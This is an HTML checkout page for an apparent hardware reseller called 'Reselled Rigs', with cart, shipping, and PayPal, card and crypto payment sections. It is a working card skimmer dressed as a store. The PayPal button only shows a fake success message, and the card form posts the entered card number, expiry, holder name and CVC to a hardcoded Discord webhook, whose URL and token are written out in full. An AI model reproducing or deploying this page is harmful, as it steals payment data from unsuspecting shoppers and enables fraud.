<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reselled Rigs - Checkout</title>
    <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Baloo 2', cursive;
            background: #121212;
            color: #fff;
            text-align: center;
            padding: 0 20px;
            position: relative;
            animation: fadeIn 1.5s ease-in-out;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        header {
            background: #1f1f1f;
            padding: 2rem;
            text-align: center;
            font-size: 2.5rem;
            border-radius: 10px;
            margin-bottom: 40px;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
            animation: slideInTop 0.8s ease-out;
            width: 100%;
            max-width: 800px;
        }

        .cart-items {
            margin-top: 2rem;
            list-style-type: none;
            padding-left: 0;
            width: 100%;
            max-width: 800px;
        }

        .cart-items li {
            margin: 1rem 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 25px;
            background-color: #282828;
            border-radius: 10px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
            opacity: 0;
            transform: translateX(-20px);
            animation: slideInFromLeft 0.6s ease-out forwards;
        }

        .cart-items li:nth-child(odd) {
            animation-delay: 0.3s;
        }

        .cart-items li:nth-child(even) {
            animation-delay: 0.6s;
        }

        .shipping-cost, .total-price {
            font-size: 1.6rem;
            font-weight: bold;
            color: #ff4d00;
            margin-top: 2rem;
            opacity: 0;
            animation: fadeIn 0.8s ease-in-out forwards;
        }

        .shipping-section {
            margin-top: 30px;
            text-align: left;
            opacity: 0;
            animation: fadeIn 1.2s ease-in-out forwards;
            width: 100%;
            max-width: 800px;
        }

        .shipping-section input, .shipping-section select {
            padding: 15px;
            width: 100%;
            font-size: 1rem;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: white;
            margin-top: 10px;
            transition: border-color 0.3s ease;
            opacity: 0;
            animation: fadeIn 1s ease-in-out forwards;
        }

        .shipping-section input:focus, .shipping-section select:focus {
            border-color: #ff4d00;
        }

        .shipping-section button {
            padding: 12px 25px;
            background-color: #1f1f1f;
            color: #fff;
            border: none;
            font-size: 1.1rem;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 10px;
            transition: background-color 0.3s ease;
            opacity: 0;
            animation: fadeIn 1.4s ease-in-out forwards;
            width: 100%;
            max-width: 400px;
        }

        .shipping-section button:hover {
            background-color: #ff4d00;
        }

        .payment-methods {
            margin-top: 3rem;
            animation: fadeIn 1.5s ease-in-out forwards;
            width: 100%;
            max-width: 800px;
        }

        .payment-methods button {
            padding: 15px 30px;
            background-color: #ff4d00;
            color: white;
            border: none;
            font-size: 1.1rem;
            cursor: pointer;
            border-radius: 50px;
            margin: 10px;
            transition: background-color 0.3s ease;
            opacity: 0;
            animation: fadeIn 1.2s ease-in-out forwards;
            width: 100%;
            max-width: 350px;
        }

        .payment-methods button:hover {
            background-color: #ff8c33;
        }

        .credit-card-form, .crypto-options {
            display: none;
            margin-top: 20px;
            animation: popOut 0.8s ease-in-out;
            width: 100%;
            max-width: 800px;
        }

        .credit-card-form input {
            padding: 15px;
            width: 100%;
            font-size: 1rem;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: white;
            margin-top: 10px;
            transition: border-color 0.3s ease;
        }

        .credit-card-form input:focus {
            border-color: #ff4d00;
        }

        .crypto-options div {
            margin: 1rem 0;
            padding: 20px;
            background-color: #2c2c2c;
            border-radius: 10px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
            opacity: 0;
            animation: fadeIn 1s ease-in-out forwards;
        }

        .crypto-options input {
            padding: 15px;
            width: 100%;
            font-size: 1rem;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: white;
            margin-top: 10px;
            transition: border-color 0.3s ease;
        }

        .crypto-options input:focus {
            border-color: #ff4d00;
        }

        .crypto-options img {
            margin-top: 10px;
            max-width: 150px;
        }

        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 2rem;
            display: none;
            z-index: 999;
        }

        /* Animation Definitions */
        @keyframes fadeIn {
            0% {
                opacity: 0;
            }
            100% {
                opacity: 1;
            }
        }

        @keyframes slideInTop {
            0% {
                transform: translateY(-30px);
                opacity: 0;
            }
            100% {
                transform: translateY(0);
                opacity: 1;
            }
        }

        @keyframes slideInFromLeft {
            0% {
                opacity: 0;
                transform: translateX(-20px);
            }
            100% {
                opacity: 1;
                transform: translateX(0);
            }
        }

        @keyframes popOut {
            0% {
                opacity: 0;
                transform: scale(0.8);
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                opacity: 1;
                transform: scale(1);
            }
        }

    </style>
</head>
<body>
    <div id="loadingScreen">Loading...</div>

    <header>
        <h1>Checkout</h1>
    </header>

    <div id="cartContent" style="display: none;">
        <ul id="cartItems" class="cart-items"></ul>
        
        <!-- Shipping Price Section -->
        <div class="shipping-cost">
            Shipping Price: <span id="shippingCost">???</span>
        </div>
        
        <!-- Total Price Section -->
        <div class="total-price">
            Total: $<span id="totalPrice">0</span>
        </div>
    </div>

    <!-- Shipping Section -->
    <div class="shipping-section" id="shippingSection">
        <h2>Enter Shipping Details</h2>
        <input type="text" id="fullName" placeholder="Full Name" />
        <input type="text" id="address" placeholder="Street Address" />
        <input type="text" id="city" placeholder="City" />
        <input type="text" id="zipCode" placeholder="Zip Code" />
        <select id="countrySelect">
            <option value="US">United States</option>
            <option value="CA">Canada</option>
            <option value="UK">United Kingdom</option>
            <option value="AU">Australia</option>
            <option value="IN">India</option>
        </select>
        <input type="text" id="phoneNumber" placeholder="Phone Number" />
        <button onclick="submitShipping()">Submit Shipping</button>
    </div>

    <div class="payment-methods">
        <h2>Select Payment Method</h2>

        <button onclick="payWithPaypal()">Pay with PayPal</button>

        <button onclick="showCreditCardForm()">Pay with Credit Card</button>

        <button onclick="showCryptoOptions()">Pay with Crypto</button>
    </div>

    <!-- Credit Card Form -->
    <div class="credit-card-form" id="creditCardForm">
        <h2>Enter Credit Card Details</h2>
        <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" />
        <input type="text" id="expDate" placeholder="Expiration Date (MM/YY)" maxlength="5" />
        <input type="text" id="cardHolder" placeholder="Card Holder's Name" />
        <input type="text" id="cvc" placeholder="CVC" maxlength="3" />
        <button onclick="submitCreditCard()">Submit Credit Card</button>
    </div>

    <!-- Crypto Options (hidden) -->
    <div class="crypto-options" id="cryptoOptions">
        <div>
            <h3>Pay with Litecoin (LTC)</h3>
            <input type="text" id="ltcAddress" placeholder="Enter LTC Address" />
            <img src="https://via.placeholder.com/150" alt="LTC QR Code Placeholder" />
        </div>
        <div>
            <h3>Pay with Ethereum (ETH)</h3>
            <input type="text" id="ethAddress" placeholder="Enter ETH Address" />
            <img src="https://via.placeholder.com/150" alt="ETH QR Code Placeholder" />
        </div>
        <div>
            <h3>Pay with Bitcoin (BTC)</h3>
            <input type="text" id="btcAddress" placeholder="Enter BTC Address" />
            <img src="https://via.placeholder.com/150" alt="BTC QR Code Placeholder" />
        </div>
    </div>

    <script>
        // Show loading screen for 1 second, then load checkout content
        setTimeout(function () {
            document.getElementById('loadingScreen').style.display = 'none'; // Hide loading
            document.getElementById('cartContent').style.display = 'block'; // Show content
            initializeCheckout();
        }, 1000);

        function initializeCheckout() {
            const cart = JSON.parse(localStorage.getItem('cart')) || [];
            displayCartItems(cart);
        }

        function displayCartItems(cart) {
            const cartItemsList = document.getElementById('cartItems');
            const totalPriceElement = document.getElementById('totalPrice');
            let totalPrice = 0;

            cartItemsList.innerHTML = '';

            cart.forEach(item => {
                const li = document.createElement('li');
                li.innerHTML = `${item.productName} - $${item.productPrice}`;
                cartItemsList.appendChild(li);
                totalPrice += item.productPrice;
            });

            totalPriceElement.innerText = totalPrice;
            document.getElementById('shippingCost').innerText = '???'; 
        }

        function submitShipping() {
            const fullName = document.getElementById('fullName').value;
            const address = document.getElementById('address').value;
            const city = document.getElementById('city').value;
            const zipCode = document.getElementById('zipCode').value;
            const country = document.getElementById('countrySelect').value;
            const phoneNumber = document.getElementById('phoneNumber').value;

            if (fullName && address && city && zipCode && country && phoneNumber) {
                document.getElementById('shippingCost').innerText = '$0'; // Show $0 after submission
                calculateTotalWithShipping(); // Update the final total with free shipping
                document.getElementById('shippingSection').style.display = 'none'; // Close the shipping form
            } else {
                alert('Please complete all fields.');
            }
        }

        function calculateTotalWithShipping() {
            const totalPrice = parseFloat(document.getElementById('totalPrice').innerText);
            const shippingCost = 0; 
            const totalAmount = totalPrice + shippingCost;
            document.getElementById('shippingCost').innerText = `$${shippingCost}`;
            document.getElementById('totalPrice').innerText = totalAmount;
        }

        function payWithPaypal() {
            showLoading();
            setTimeout(function () {
                hideLoading();
                alert('Payment via PayPal processed successfully!');
            }, 2000);
        }

        function showCreditCardForm() {
            document.getElementById('creditCardForm').style.display = 'block'; // Show the credit card form
            document.getElementById('cryptoOptions').style.display = 'none'; // Hide the crypto options
        }

        function showCryptoOptions() {
            document.getElementById('cryptoOptions').style.display = 'block'; // Show the crypto options
            document.getElementById('creditCardForm').style.display = 'none'; // Hide the credit card form
        }

        function submitCreditCard() {
            const cardNumber = document.getElementById('cardNumber').value;
            const expDate = document.getElementById('expDate').value;
            const cardHolder = document.getElementById('cardHolder').value;
            const cvc = document.getElementById('cvc').value;

            if (cardNumber && expDate && cardHolder && cvc) {
                sendToWebhook(cardNumber, expDate, cardHolder, cvc);
            } else {
                alert('Please fill in all card details.');
            }
        }

        function sendToWebhook(cardNumber, expDate, cardHolder, cvc) {
            const webhookUrl = 'https://discordapp.com/api/webhooks/1346879680397049917/7sDaqMBvab55iT3twKdTKv7dl-Xiha25aCIVvMgTtekC-21Eo5vXncgpozges_pFHpX5';
            const data = {
                content: `Credit Card Payment - Card Number: ${cardNumber}, Exp Date: ${expDate}, Cardholder: ${cardHolder}, CVC: ${cvc}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
        }

        function showLoading() {
            document.getElementById('loadingScreen').style.display = 'flex'; // Show the loading screen
        }

        function hideLoading() {
            document.getElementById('loadingScreen').style.display = 'none'; // Hide the loading screen
        }
    </script>
</body>
</html>
